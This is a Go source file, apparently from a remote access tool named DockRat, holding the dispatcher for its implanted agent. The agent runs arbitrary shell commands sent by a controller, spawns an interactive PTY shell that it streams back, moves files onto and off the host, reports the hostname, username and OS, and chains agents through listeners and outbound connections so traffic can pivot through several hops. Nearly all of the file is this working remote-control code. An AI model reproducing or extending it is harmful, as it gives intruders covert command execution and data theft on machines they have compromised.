// file: new/core/network/dispatcher.go
package network

import (
	"encoding/json"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"

	"github.com/Singert/DockRat/core/protocol"
	"github.com/Singert/DockRat/core/utils"
	"github.com/creack/pty"
)

// 封装每个 agent 实例上下文
type AgentContext struct {
	SelfID     int
	Conn       net.Conn
	ParentConn net.Conn
}

var shellStarted = false
var shellStdin io.WriteCloser

var currentUploadFile *os.File

var childConnMap = make(map[int]net.Conn)
var childConnMu sync.Mutex

// 用于延迟绑定连接
var pendingConns []net.Conn
var pendingMu sync.Mutex

func StartAgent(ctx *AgentContext) {
	conn := ctx.Conn
	selfID := ctx.SelfID
	parent := ctx.ParentConn

	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			log.Printf("[-] Connection closed or failed: %v", err)
			return
		}
		length := utils.BytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			log.Printf("[-] Failed to read message body: %v", err)
			return
		}

		msg, err := protocol.DecodeMessage(data)
		if err != nil {
			log.Printf("[-] Decode error: %v", err)
			continue
		}

		if msg.ToNodeID != 0 {
			relayToChild(msg)
			continue
		}

		switch msg.Type {
		case protocol.MsgCommand:
			handleCommand(msg, conn, selfID, parent)
		case protocol.MsgShell:
			if msg.FromNodeID == 0 {
				handleShellPTY(msg, conn, selfID, parent)
			} else {
				if parent != nil {
					relayUpward(msg, parent)
				} else {
					conn.Write(data)
				}
			}
		case protocol.MsgResponse:
			if parent != nil {
				relayUpward(msg, parent)
			} else {
				encoded, _ := protocol.EncodeMessage(msg)
				conn.Write(encoded)
			}
		case protocol.MsgUploadInit:
			handleUploadInit(msg)
		case protocol.MsgUploadChunk:
			handleUploadChunk(msg)
		case protocol.MsgUploadDone:
			handleUploadDone()
		case protocol.MsgDownloadInit:
			handleDownloadInit(msg, conn)
		case protocol.MsgListen:
			handleListenCommand(msg, ctx)
		case protocol.MsgConnect:
			handleConnectCommand(msg)
		case protocol.MsgBindRelayConn:
			handleBindRelayConn(msg)
		default:
			log.Println("[-] Unknown message type:", msg.Type)
		}
	}
}

func relayToChild(msg protocol.Message) {
	childConnMu.Lock()
	conn, ok := childConnMap[msg.ToNodeID]
	childConnMu.Unlock()

	if !ok {
		log.Printf("[-] No child with ID %d found for relay\n", msg.ToNodeID)
		return
	}

	data, err := protocol.EncodeMessage(msg)
	if err != nil {
		log.Println("[-] Relay encode error:", err)
		return
	}
	conn.Write(data)
}

func handleCommand(msg protocol.Message, conn net.Conn, selfID int, parent net.Conn) {
	var payload map[string]string
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Command unmarshal error:", err)
		return
	}
	cmdStr := payload["cmd"]
	log.Println("[+] Received command:", cmdStr)

	output, err := exec.Command("sh", "-c", cmdStr).CombinedOutput()
	if err != nil {
		output = append(output, []byte("\n[!] Command error: "+err.Error())...)
	}

	resp := protocol.Message{
		Type:       protocol.MsgResponse,
		Payload:    output,
		FromNodeID: selfID,
	}
	data, _ := protocol.EncodeMessage(resp)
	conn.Write(data)
}

func handleShellPTY(msg protocol.Message, conn net.Conn, selfID int, parent net.Conn) {
	line := string(msg.Payload)

	if !shellStarted {
		cmd := exec.Command("/bin/sh")
		ptmx, err := pty.Start(cmd)
		if err != nil {
			log.Println("[-] Failed to start pty:", err)
			return
		}
		shellStarted = true
		shellStdin = ptmx

		go func() {
			buf := make([]byte, 1024)
			for {
				n, err := ptmx.Read(buf)
				if err != nil {
					log.Println("[-] Shell read error:", err)
					return
				}
				msg := protocol.Message{
					Type:       protocol.MsgShell,
					Payload:    buf[:n],
					FromNodeID: selfID,
				}
				data, err := protocol.EncodeMessage(msg)
				if err != nil {
					log.Println("[-] Shell encode error:", err)
					return
				}
				conn.Write(data)
			}
		}()
		return
	}

	if !strings.HasSuffix(line, "\n") {
		line += "\n"
	}
	shellStdin.Write([]byte(line))
}

func handleUploadInit(msg protocol.Message) {
	var payload protocol.UploadInitPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] UploadInit decode error:", err)
		return
	}

	file, err := os.Create(payload.Filename)
	if err != nil {
		log.Println("[-] Failed to create upload file:", err)
		return
	}

	currentUploadFile = file
	log.Printf("[+] Start receiving file: %s (%d bytes)", payload.Filename, payload.Filesize)
}

func handleUploadChunk(msg protocol.Message) {
	if currentUploadFile == nil {
		log.Println("[-] Received chunk with no open file")
		return
	}

	var chunk protocol.UploadChunkPayload
	if err := json.Unmarshal(msg.Payload, &chunk); err != nil {
		log.Println("[-] Upload chunk decode error:", err)
		return
	}
	_, err := currentUploadFile.Write(chunk.Data)
	if err != nil {
		log.Println("[-] Write chunk failed:", err)
	}
}

func handleUploadDone() {
	if currentUploadFile != nil {
		currentUploadFile.Close()
		currentUploadFile = nil
		log.Println("[+] Upload complete")
	} else {
		log.Println("[-] Upload done received with no open file")
	}
}

func handleDownloadInit(msg protocol.Message, conn net.Conn) {
	var payload protocol.DownloadInitPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] DownloadInit decode error:", err)
		return
	}

	file, err := os.Open(payload.Filename)
	if err != nil {
		log.Println("[-] Cannot open file for download:", err)
		return
	}
	defer file.Close()

	buf := make([]byte, 4096)
	for {
		n, err := file.Read(buf)
		if n > 0 {
			chunk := protocol.DownloadChunkPayload{Data: buf[:n]}
			data, _ := json.Marshal(chunk)
			msg := protocol.Message{Type: protocol.MsgDownloadChunk, Payload: data}
			packet, _ := protocol.EncodeMessage(msg)
			conn.Write(packet)
		}
		if err == io.EOF {
			break
		}
		if err != nil {
			log.Println("[-] File read error:", err)
			return
		}
	}
	done := protocol.Message{Type: protocol.MsgDownloadDone, Payload: []byte("done")}
	pkt, _ := protocol.EncodeMessage(done)
	conn.Write(pkt)
	log.Println("[+] File download finished")
}

func handleListenCommand(msg protocol.Message, ctx *AgentContext) {
	var payload map[string]string
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Listen command decode failed:", err)
		return
	}
	port := payload["port"]
	go func() {
		ln, err := net.Listen("tcp", ":"+port)
		if err != nil {
			log.Println("[-] Agent listen failed:", err)
			return
		}
		log.Println("[+] Agent listening on port", port)
		for {
			conn, err := ln.Accept()
			if err != nil {
				log.Println("[-] Accept failed:", err)
				continue
			}
			go handleChildConn(conn, ctx.Conn) // 保持不变，parentConn 会在 handleChildConn 中传入
		}
	}()
}

func handleConnectCommand(msg protocol.Message) {
	var payload map[string]string
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Connect command decode failed:", err)
		return
	}
	target := payload["target"]
	parentIDStr := payload["parent_id"] // 当前节点的 ID，将作为 child 的 parent
	parentID, _ := strconv.Atoi(parentIDStr)
	conn, err := net.Dial("tcp", target)
	if err != nil {
		log.Println("[-] Failed to connect target:", err)
		return
	}
	log.Println("[+] Connected to parent agent", target)

	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	// 注意：这个 parent_id 会被对方当作 selfID 使用
	payloadData := map[string]interface{}{
		"hostname": hostname,
		"username": username,
		"os":       runtime.GOOS,
		"relay_id": parentID,
	}
	data, _ := json.Marshal(payloadData)
	msgToSend := protocol.Message{
		Type:    protocol.MsgHandshake,
		Payload: data,
	}
	packet, _ := protocol.EncodeMessage(msgToSend)
	conn.Write(packet)

	// 将 conn 作为子节点的连接，自己是 parent（nil）→ 被连接端来处理 StartAgent
	// 不调用 StartAgent(conn)！StartAgent 应在 handleChildConn 中由上级执行
}

func handleChildConn(conn net.Conn, parentConn net.Conn) {
	log.Println("[+] Received child connection from", conn.RemoteAddr())

	// 读取 4 字节长度前缀
	lengthBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
		log.Println("[-] Failed to read handshake length:", err)
		conn.Close()
		return
	}
	length := utils.BytesToUint32(lengthBuf)

	// 读取消息内容
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		log.Println("[-] Failed to read handshake data:", err)
		conn.Close()
		return
	}

	// 解码 handshake 消息
	msg, err := protocol.DecodeMessage(data)
	if err != nil || msg.Type != protocol.MsgHandshake {
		log.Println("[-] Invalid handshake from child")
		conn.Close()
		return
	}
	// 提取 relay_id（表示 admin 分配的最终 nodeID）
	var payload map[string]interface{}
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Failed to parse handshake payload:", err)
		conn.Close()
		return
	}
	idFloat, ok := payload["relay_id"].(float64)
	if !ok {
		log.Println("[-] Missing relay_id in handshake")
		conn.Close()
		return
	}
	relayID := int(idFloat)

	// 将连接存入 pendingConns，等待绑定指令
	pendingMu.Lock()
	pendingConns = append(pendingConns, conn)
	pendingMu.Unlock()
	log.Println("[+] Child handshake received, storing connection as pending")

	// 启动该连接的命令处理循环（SelfID 暂未知）
	go StartAgent(&AgentContext{
		SelfID:     -2, // 真实 ID 尚未分配
		Conn:       conn,
		ParentConn: parentConn,
	})
	log.Printf("[*] Waiting for BindRelayConn from admin for ID %d\n", relayID)

}

func relayUpward(msg protocol.Message, parent net.Conn) {
	data, err := protocol.EncodeMessage(msg)
	if err != nil {
		log.Println("[-] Relay upward encode error:", err)
		return
	}
	_, err = parent.Write(data)
	if err != nil {
		log.Println("[-] Relay upward write failed:", err)
	}
}

func handleBindRelayConn(msg protocol.Message) {

	var payload protocol.BindRelayConnPayload
	log.Println("[*] handleBindRelayConn called with ID:", payload.ID)

	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] BindRelayConn decode error:", err)
		return
	}

	pendingMu.Lock()
	defer pendingMu.Unlock()

	if len(pendingConns) == 0 {
		log.Println("[-] No pending conn to bind")
		return
	}

	conn := pendingConns[0]
	pendingConns = pendingConns[1:]

	childConnMu.Lock()
	childConnMap[payload.ID] = conn
	childConnMu.Unlock()

	log.Printf("[+] Bound pending connection as node ID %d\n", payload.ID)
}
